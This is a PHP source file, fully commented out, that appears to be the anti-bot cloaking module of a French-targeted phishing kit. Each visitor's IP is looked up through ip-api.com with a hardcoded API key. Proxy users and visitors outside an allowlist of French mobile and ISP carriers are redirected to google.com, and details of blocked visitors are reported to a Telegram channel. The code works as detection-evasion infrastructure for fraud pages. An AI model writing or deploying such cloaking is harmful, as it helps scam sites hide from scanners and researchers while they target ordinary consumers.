<?php //
//
//
//if(!isset($config)){
//    header('Location: https://google.com');
//}
//else{
//    $antibots_enabled = $config["antibots_enabled"];
//
//    $block_proxies = $config["block_proxies"];
//    $block_bots = $config["block_bots"];
//
//    // Ajouter ici des opérateurs si besoin
//    $authorized_as = [
//
//        // Principaux
//        "SFR",
//        "sfr",
//        "Societe Francaise Du Radiotelephone",
//        "Radiotelephone",
//        "Societe Francaise",
//        "N9UF",
//        "NUMERICABLE",
//        "PRIXTEL",
//        "FREE",
//        "ORANGE",
//        "BOUYGUES",
//        "SOSH",
//        "Sosh",
//
//        // Secondaires
//        "Auchan Telecom",
//        "Carrefour Mobile",
//        "Leclerc Mobile",
//        "M6 Mobile",
//        "La Poste Mobile",
//        "NRJ Mobile",
//        "Afone Mobile",
//        "Coriolis Télécom",
//
//
//        // Autres
//        "LYCA",
//    ];
//
//    function gather_ip_informations($antibots_enabled){
//
//        if($antibots_enabled){
//            if($_SERVER["REMOTE_ADDR"] == "::1"){
//                $ip = "93.23.197.129";
//            }
//            else{
//                $ip = $_SERVER["REMOTE_ADDR"];
//            }
//        }
//        else{
//            $ip = "93.23.197.129";
//        }
//
//        $url = "https://pro.ip-api.com/json/".$ip."?key=s3DD9L9nYAxD9mz&fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
//        $response = file_get_contents($url);
//
//        if(1 == 1){
//            return $response;
//        }
//        // Getting ip de secours au cas ou la première API saute / rate limit
//        else{
//            $second_url = "https://ip2.app/info.php?ip=". $ip;
//            $second_response = file_get_contents($second_url);
//            return $second_response;
//        }
//
//    }
//
//    function redirect_proxies_user($user_ip_infos,$block_proxies){
//        $is_proxy = $user_ip_infos["proxy"];
//
//        if($block_proxies){
//            if($is_proxy){
//                header("Location: https://google.com");
//            }
//        }
//    }
//
//    function redirect_bots($user_ip_infos,$block_bots,$authorized_as,$config){
//        if(isset($user_ip_infos["as"])){
//            $as_name = $user_ip_infos["as"];
//        }
//        else{
//            // Getting ip de secours au cas ou la première API saute / rate limit
//            $as_name = $user_ip_infos["asn"];
//        }
//
//        $country =  $user_ip_infos["country"];
//        $organisation_name = $user_ip_infos["org"];
//
//        $is_authorized  = false;
//
//        if($block_bots){
//
//            foreach($authorized_as as $authorized){
//
//                if(strstr($as_name,$authorized)){
//                    $is_authorized = true;
//                }
//
//            }
//
//            if(!$is_authorized){
//                if($config["enable_notification_bot_blocked_telegram"]){
//
//                    $user_agent = $_SERVER['HTTP_USER_AGENT'];
//                    $user_ip = $_SERVER['REMOTE_ADDR'];
//                    $user_url =  $_SERVER['HTTP_HOST'];
//                    $first_login_date = date("d/m/Y");
//
//                    $to_send = "
//                        [🧳]_Bot_bloqué_[🧳]
//
//                        Ip_:_$user_ip
//                        User-Agent_:_$user_agent
//                        Url_:_$user_url
//                        Date_:_$first_login_date
//
//                        [☂️]_Autre_infos_[☂️]
//
//                        Pays_:_$country
//                        Fournisseur_d'accès_:_$organisation_name
//                        ";
//                    // Les
//                    $to_send = str_replace(" ","",$to_send);
//                    $to_send = str_replace("_"," ",$to_send);
//
//                    send_telegram_notification($to_send,$config);
//
//
//                }
//
//                header("Location: https://google.com");
//            }
//
//        }
//
//    }
//
//    $user_ip_infos = json_decode(gather_ip_informations($antibots_enabled),true);
//
//    redirect_proxies_user($user_ip_infos,$block_proxies); // Block proxies
//    redirect_bots($user_ip_infos,$block_bots,$authorized_as,$config); // Block bots
//}
//
//
//
//?>